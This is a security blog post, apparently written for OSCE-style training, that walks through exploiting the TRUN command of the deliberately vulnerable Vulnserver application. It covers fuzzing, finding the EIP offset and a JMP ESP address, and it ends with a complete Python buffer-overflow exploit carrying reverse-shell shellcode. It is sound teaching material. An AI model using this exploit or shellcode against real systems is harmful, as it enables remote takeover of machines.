---
slug: vulnserver-trun/
title: Vulnserver TRUN Exploitation
date: 2020-06-10
category: attacks
subtitle: From zero to shell
tags: osce, vulnserver, training, exploit
image: https://res.cloudinary.com/fluid-attacks/image/upload/v1620331211/blog/vulnserver-trun/cover_squjnn.webp
alt: Photo by David Rangel on Unsplash
description: This post will describe the steps taken to exploit the
  Vulnserver TRUN command using a direct EIP overwrite strategy.
keywords: Business, Information, Security, Protection, Hacking, Exploit,
  OSCE, Ethical Hacking, Pentesting
author: Andres Roldan
writer: aroldan
name: Andres Roldan
about1: Cybersecurity Specialist, OSCP, CHFI
about2: '"We don''t need the key, we''ll break in" RATM'
source: https://unsplash.com/photos/4m7gmLNr3M0
---

Vulnserver is the natural next step to follow after finishing the Offsec
`CTP` course. It’s a `VbD` (Vulnerable-by-Design) application designed
to help you sharpen the Windows exploitation skills. You can download
the executable [here](https://github.com/stephenbradshaw/vulnserver)
along with the source code. Remember that you must grab the
`essfunc.dll` file as well. However, this post (and the others to come)
will try to replicate a [grey box](../../services/continuous-hacking/)
scenario that is the most common in real exploitation. In which we only
will have access to the binary, and we must start doing things like
recognizance, enumeration, and fuzzing.

**WARNING:** Do NOT run `vulnserver.exe` on a sensitive machine or a
non-secure network. It will be a backdoor that may be used by others to
break into your system.

## Enumerating Vulnserver

If you launch `vulnserver.exe` with no options, the default used port
will be **TCP/9999**.

<div class="imgblock">

![vulnserver](https://res.cloudinary.com/fluid-attacks/image/upload/v1620331211/blog/vulnserver-trun/vulnserver1_tbmjrc.webp)

</div>

If we type `HELP`, we can see the available commands. The commands
commonly receive a single parameter and will return a simple answer. In
this post, we are going to check the `TRUN` command.

<div class="imgblock">

![trun](https://res.cloudinary.com/fluid-attacks/image/upload/v1620331210/blog/vulnserver-trun/trun1_ovjdbi.webp)

</div>

For that, we issue the `TRUN` command with a single parameter and check
the answer.

## Fuzzing Vulnserver

Now that we know that the `TRUN` command receives a single parameter, we
can start fuzzing it.

For that, we’ll be using
[Spike](https://github.com/guilhermeferreira/spikepp/), a protocol
fuzzer. More info on `Spike` can be found
[here](https://resources.infosecinstitute.com/intro-to-fuzzing/).

As we determined before, `TRUN` takes a single parameter. Having noted
that, we can create the `Spike` script as simple as:

**trun.spk.**

``` c
s_string("TRUN ");
s_string_variable("*");
```

Notice that we are using two different `Spike` commands. The `s_string`
command will send an immutable string to the fuzzed protocol and
`s_string_variable` tells `Spike` to mutate that string.

Now we can send the fuzz attack to the victim machine:

<div class="imgblock">

![Running
spike](https://res.cloudinary.com/fluid-attacks/image/upload/v1620331207/blog/vulnserver-trun/trun2_x0dg8a.webp)

</div>

Look at that: After only 3 iterations, `vulnserver.exe` stopped working,
and it seems that it happened when we sent 5000 bytes of data. We can
see this in `Wireshark`:

<div class="imgblock">

![Wireshark
capture](https://res.cloudinary.com/fluid-attacks/image/upload/v1620331212/blog/vulnserver-trun/trun3_esxmlu.webp)

</div>

With that, we can start replicating the crash. For that, we create the
first `PoC` (Proof-of-Concept) file:

**exploit.py.**

``` python
import socket

HOST = '192.168.0.23'
PORT = 9999

PAYLOAD = (
    b'TRUN /.:/' +
    b'A' * 5000
)

with socket.create_connection((HOST, PORT)) as fd:
    fd.sendall(PAYLOAD)
```

This time, let’s attach `vulnserver.exe` to a debugger. I will use
[Immunity Debugger](https://www.immunityinc.com/products/debugger/) with
[mona.py](https://github.com/corelan/mona) plugin.

So, let’s run the initial exploit and see what happens:

<div class="imgblock">

![Exploit: take
1](https://res.cloudinary.com/fluid-attacks/image/upload/v1620331210/blog/vulnserver-trun/trun4_rs2er8.gif)

</div>

Great\! We were able to replicate the crash of `Vulnserver`.

<div class="imgblock">

![Controlling
EIP](https://res.cloudinary.com/fluid-attacks/image/upload/v1620331207/blog/vulnserver-trun/trun5_oqfsa9.webp)

</div>

If you look carefully at the image, you can see that the `EIP` register
has the value of `41414141` which is the hex representation of our
payload of `A`. `EIP` points to the next instruction to be executed, so
if we can control `EIP`, we have full control of the execution flow of
the whole application. Beautiful, isn’t it?

But remember that we injected 5000 `A`, so we must know the exact offset
on where `EIP` gets overwritten. To do that, we can create a cyclic
pattern of chars that will help us identify the exact offset that we
must inject to the buffer in order to control `EIP`. We will use a tool
from `Metasploit` called `pattern_create.rb`:

**Running pattern\_create.rb.**

``` console
cd /opt/metasploit-framework/embedded/framework/tools/exploit/
/pattern_create.rb -l 5000
```

<div class="imgblock">

![Cyclic
pattern](https://res.cloudinary.com/fluid-attacks/image/upload/v1620331210/blog/vulnserver-trun/pattern1_qenkwj.webp)

</div>

We then add that pattern to our exploit, replacing the buffer of `A`
with our pattern:

**exploit.py.**

``` python
import socket

HOST = '192.168.0.23'
PORT = 9999

PAYLOAD = (
    b'TRUN /.:/' +
    b'<paste pattern here>'
)

with socket.create_connection((HOST, PORT)) as fd:
    fd.sendall(PAYLOAD)
```

And we run the exploit again:

<div class="imgblock">

![Exploit: take
2](https://res.cloudinary.com/fluid-attacks/image/upload/v1620331211/blog/vulnserver-trun/trun6_mcugty.gif)

</div>

<div class="imgblock">

![Cyclic pattern on
EIP](https://res.cloudinary.com/fluid-attacks/image/upload/v1620331208/blog/vulnserver-trun/trun7_bo0j8a.webp)

</div>

As you can see, the `EIP` register now holds the value `386F4337`. We
need to check the exact offset of that string on our unique cyclic
pattern. To do that, we can use `pattern_offset.rb` from `Metasploit`:

<div class="imgblock">

![Pattern
offset](https://res.cloudinary.com/fluid-attacks/image/upload/v1620331211/blog/vulnserver-trun/pattern2_rnak0v.webp)

</div>

Great, it tells us that the `EIP` gets overwritten starting on the
**2003** byte of our buffer. Let’s update the exploit to verify that:

**exploit.py.**

``` python
import socket

HOST = '192.168.0.23'
PORT = 9999

PAYLOAD = (
    b'TRUN /.:/' +
    b'A' * 2003 +
    b'B' * 4 +
    b'C' * (5000 - 2003 - 4)
)

with socket.create_connection((HOST, PORT)) as fd:
    fd.sendall(PAYLOAD)
```

In this updated exploit, we will send a buffer of 2003 `A`, then a
single 4 byte string of `B` (whose hex representation is `42`) and fill
the rest of our 5000 buffer with `C`. If the offset is correct, `EIP`
will hold the value of `42424242` which are the four bytes of our `B`
buffer:

<div class="imgblock">

![Correct offset to
EIP](https://res.cloudinary.com/fluid-attacks/image/upload/v1620331209/blog/vulnserver-trun/trun8_q36yi7.gif)

</div>

Awesome\! Now, we know the exact structure of the vulnerability, and we
can proceed to exploit it.

## Exploiting

Let’s look at the value of the registers at the time of the crash.

<div class="imgblock">

![Registers](https://res.cloudinary.com/fluid-attacks/image/upload/v1620331208/blog/vulnserver-trun/trun9_exxpsn.webp)

</div>

As you can see, two registers point to our injected buffer: `EAX`, and
`ESP`. `EAX` points at the exact beginning of our injected buffer but
includes the chars `TRUN /.:/`. Those may be translated to harmless
`ASM` instructions but we must not risk our exploitation. However, we
have the other register `ESP` which points directly to our controlled
buffer.

Using `!mona findmsp` inside the debugger, we can find this information,
along with the continuous space available for us to inject our
shellcode.

**findmsp.**

``` console
!mona findmsp
```

<div class="imgblock">

![Mona
output](https://res.cloudinary.com/fluid-attacks/image/upload/v1620331209/blog/vulnserver-trun/mona1_ckv1sd.webp)

</div>

Note that we have 984 bytes after `ESP` available for us to run anything
we’d want. First, we must search on `vulnserver.exe` and its runtime
modules, an instruction that can lead us to execute code starting on the
memory region pointed by `ESP`.

First, let’s find the `Vulnserver` runtime dependencies:

<div class="imgblock">

![Runtime
dependencies](https://res.cloudinary.com/fluid-attacks/image/upload/v1620331210/blog/vulnserver-trun/deps1_wkyc6j.webp)

</div>

It is always a good idea to look for instructions on files that are not
part of the `OS` because the address of those instructions will likely
change over different Windows versions, and that makes the exploit less
portable. Also, a null byte (`0x00`) on the address of the desired
instruction can stop our attack.

`mona.py` can also help us to identify the desired instructions on the
desired modules, by running:

**mona.**

``` console
!mona jmp -r esp -cp nonull -o
```

<div class="imgblock">

![JMP ESP
instructions](https://res.cloudinary.com/fluid-attacks/image/upload/v1620331209/blog/vulnserver-trun/esp1_nq7r8o.webp)

</div>

As you can see, there are several `JMP ESP` instructions we can pick. We
are going to pick the one at `62501205`. Let’s update the exploit and
replace the four `B` with that address:

**exploit.py.**

``` python
import socket
import struct

HOST = '192.168.0.23'
PORT = 9999

PAYLOAD = (
    b'TRUN /.:/' +
    b'A' * 2003 +
    # 62501205   FFE4             JMP ESP
    struct.pack('<L', 0x62501205) +
    b'C' * (5000 - 2003 - 4)
)

with socket.create_connection((HOST, PORT)) as fd:
    fd.sendall(PAYLOAD)
```

If everything comes as expected, we will hit that `JMP ESP` instruction
that will lead us to execute code on our `C` buffer. Let’s put a
breakpoint at the `JMP ESP` instruction and run the exploit:

<div class="imgblock">

![Performing the JMP
ESP](https://res.cloudinary.com/fluid-attacks/image/upload/v1620331210/blog/vulnserver-trun/trun10_d5p7nq.gif)

</div>

Great\!

All that’s left is to include a shellcode in place of the buffer of `C`
so can execute commands on the victim machine. We will use a reverse
shell payload as generated by `msfvenom`:

<div class="imgblock">

![Generating reverse
shell](https://res.cloudinary.com/fluid-attacks/image/upload/v1620331207/blog/vulnserver-trun/msfvenom1_sggiak.webp)

</div>

As a rule of thumb, get used to generate shellcodes without bad chars
that may break the execution flow of our attack, such as null bytes
(`0x0`), line feed (`\r or 0xa`), and carriage return (`\n or 0xd`). You
can see a detailed way of checking for bad chars on
[LTER](../vulnserver-lter-seh/) article.

Also, note that our `JMP ESP` led us to our `C` but not exactly at the
beginning, so we must pad the exploit with some `C` chars to make the
payload slide gracefully to the start of our reverse shell.

Let’s update the exploit:

**exploit.py.**

``` python
import socket
import struct

HOST = '192.168.0.23'
PORT = 9999

SHELL =  b""
SHELL += b"\xb8\x9e\x3b\xe5\xc4\xda\xcf\xd9\x74\x24\xf4\x5d"
SHELL += b"\x2b\xc9\xb1\x52\x31\x45\x12\x83\xc5\x04\x03\xdb"
SHELL += b"\x35\x07\x31\x1f\xa1\x45\xba\xdf\x32\x2a\x32\x3a"
SHELL += b"\x03\x6a\x20\x4f\x34\x5a\x22\x1d\xb9\x11\x66\xb5"
SHELL += b"\x4a\x57\xaf\xba\xfb\xd2\x89\xf5\xfc\x4f\xe9\x94"
SHELL += b"\x7e\x92\x3e\x76\xbe\x5d\x33\x77\x87\x80\xbe\x25"
SHELL += b"\x50\xce\x6d\xd9\xd5\x9a\xad\x52\xa5\x0b\xb6\x87"
SHELL += b"\x7e\x2d\x97\x16\xf4\x74\x37\x99\xd9\x0c\x7e\x81"
SHELL += b"\x3e\x28\xc8\x3a\xf4\xc6\xcb\xea\xc4\x27\x67\xd3"
SHELL += b"\xe8\xd5\x79\x14\xce\x05\x0c\x6c\x2c\xbb\x17\xab"
SHELL += b"\x4e\x67\x9d\x2f\xe8\xec\x05\x8b\x08\x20\xd3\x58"
SHELL += b"\x06\x8d\x97\x06\x0b\x10\x7b\x3d\x37\x99\x7a\x91"
SHELL += b"\xb1\xd9\x58\x35\x99\xba\xc1\x6c\x47\x6c\xfd\x6e"
SHELL += b"\x28\xd1\x5b\xe5\xc5\x06\xd6\xa4\x81\xeb\xdb\x56"
SHELL += b"\x52\x64\x6b\x25\x60\x2b\xc7\xa1\xc8\xa4\xc1\x36"
SHELL += b"\x2e\x9f\xb6\xa8\xd1\x20\xc7\xe1\x15\x74\x97\x99"
SHELL += b"\xbc\xf5\x7c\x59\x40\x20\xd2\x09\xee\x9b\x93\xf9"
SHELL += b"\x4e\x4c\x7c\x13\x41\xb3\x9c\x1c\x8b\xdc\x37\xe7"
SHELL += b"\x5c\x23\x6f\xe7\x88\xcb\x72\xe7\xa1\x57\xfa\x01"
SHELL += b"\xab\x77\xaa\x9a\x44\xe1\xf7\x50\xf4\xee\x2d\x1d"
SHELL += b"\x36\x64\xc2\xe2\xf9\x8d\xaf\xf0\x6e\x7e\xfa\xaa"
SHELL += b"\x39\x81\xd0\xc2\xa6\x10\xbf\x12\xa0\x08\x68\x45"
SHELL += b"\xe5\xff\x61\x03\x1b\x59\xd8\x31\xe6\x3f\x23\xf1"
SHELL += b"\x3d\xfc\xaa\xf8\xb0\xb8\x88\xea\x0c\x40\x95\x5e"
SHELL += b"\xc1\x17\x43\x08\xa7\xc1\x25\xe2\x71\xbd\xef\x62"
SHELL += b"\x07\x8d\x2f\xf4\x08\xd8\xd9\x18\xb8\xb5\x9f\x27"
SHELL += b"\x75\x52\x28\x50\x6b\xc2\xd7\x8b\x2f\xe2\x35\x19"
SHELL += b"\x5a\x8b\xe3\xc8\xe7\xd6\x13\x27\x2b\xef\x97\xcd"
SHELL += b"\xd4\x14\x87\xa4\xd1\x51\x0f\x55\xa8\xca\xfa\x59"
SHELL += b"\x1f\xea\x2e"

PAYLOAD = (
    b'TRUN /.:/' +
    b'A' * 2003 +
    # 62501205   FFE4             JMP ESP
    struct.pack('<L', 0x62501205) +
    b'C' * 32 +
    SHELL +
    b'C' * (5000 - 2003 - 4 - 32 - len(SHELL))
)

with socket.create_connection((HOST, PORT)) as fd:
    fd.sendall(PAYLOAD)
```

And let’s check it:

<div class="imgblock">

![Our reverse
shell](https://res.cloudinary.com/fluid-attacks/image/upload/v1620331208/blog/vulnserver-trun/success_kmx7zp.gif)

</div>

Great\! We got our shell\!

You can download the final exploit [here](exploit.py)

## Conclusion

This was one of the most straightforward exploits for Vulnserver. Other
commands will pose a little more effort, but fear not; we will post here
how to exploit them successfully.
